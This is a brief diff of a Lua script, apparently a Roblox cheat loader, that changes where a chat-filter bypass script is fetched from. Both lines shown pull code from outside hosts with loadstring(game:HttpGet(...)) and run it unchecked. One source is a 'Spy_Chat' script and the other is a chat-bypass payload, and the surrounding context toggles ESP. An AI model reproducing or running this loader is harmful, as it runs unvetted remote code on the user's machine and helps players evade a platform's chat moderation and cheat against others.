@@ -32,7 +32,7 @@ end
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Aaron2599/AaronsScriptHub/master/Spy_Chat.lua'))()
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/bedra45/chetbypasser/main/chetbypass'))()
+loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
 
 
 if esp == 1 then 
